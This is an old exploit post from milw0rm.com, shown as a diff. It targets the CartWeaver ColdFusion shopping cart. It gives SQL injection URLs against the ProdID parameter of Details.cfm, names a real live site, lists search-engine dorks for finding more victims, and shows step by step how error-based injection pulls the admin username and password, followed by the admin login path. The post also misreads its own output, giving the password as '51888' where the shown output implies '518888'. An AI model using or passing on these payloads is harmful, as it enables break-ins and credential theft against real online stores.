@@ -1,0 +1,37 @@
+author:meoconx[at]vnbrain.net
+product:CartWeaver
+main site:www.cartweaver.com
+1.with CFM CartWeaver:
+sql injection in:
+Details.cfm?ProdID=a'
+
+demo:
+http://www.jbracing.co.uk/Details.cfm?ProdID=1'
+****************
+exploit:
+http://www.xxx.com/Details.cfm?ProdID=[sql query]
+****************
+link admin:
+http://www.xxx.com/[script path]/cw2/admin/
+****************
+dork:
+allinurl:Details.cfm ?ProdID=
+allinurl:Results.cfm?category=
+***************
+********************
+An example:
+http://www.xxxxx.co.uk/Details.cfm?ProdID=1'
+********************
+exploit it:
+-get username:
+http://www.xxxxx.co.uk/Details.cfm?ProdID=1%20and%201=convert(int,(select%20top%201%20admin_username%20from%20tbl_adminusers))
+Conversion failed when converting the nvarchar value 'jim' to data type int.
+==> the username is "jim"
+-get password:
+http://www.xxxxx.co.uk/Details.cfm?ProdID=1%20and%201=convert(int,(select%20top%201%20char(97)%2badmin_password%20from%20tbl_adminusers))
+Conversion failed when converting the nvarchar value 'a518888' to data type int. The error occurred. on line 116.
+==> the password is "51888"( because we added the "a" in the query to get the number that can be converted to integer value)
+-now, login into admin:
+http://www.xxxxx.co.uk/cw2/admin/
+
+# milw0rm.com [2007-08-06]
